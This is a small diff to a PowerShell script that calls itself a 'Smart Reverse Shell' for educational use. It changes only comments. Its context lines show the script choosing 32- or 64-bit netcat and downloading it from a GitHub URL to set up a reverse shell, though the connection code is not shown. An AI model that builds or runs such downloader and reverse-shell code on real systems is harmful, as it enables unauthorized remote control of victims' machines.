@@ -1,4 +1,4 @@
-# mrmshell2.ps1 - Smart Reverse Shell (Auto 32/64-bit, No Errors)
+# mrmshell2.ps1 - Smart Reverse Shell (No Errors, Auto 32/64-bit)
 # Educational use only
 
 # 1. Enable TLS 1.2
@@ -7,9 +7,9 @@
 # 2. Auto-detect architecture
 $is64bit = [Environment]::Is64BitOperatingSystem
 $ncUrl = if ($is64bit) {
-    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe"  # 64-bit
+    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe"
 } else {
-    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"     # 32-bit
+    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"
 }
 
 # 3. Settings
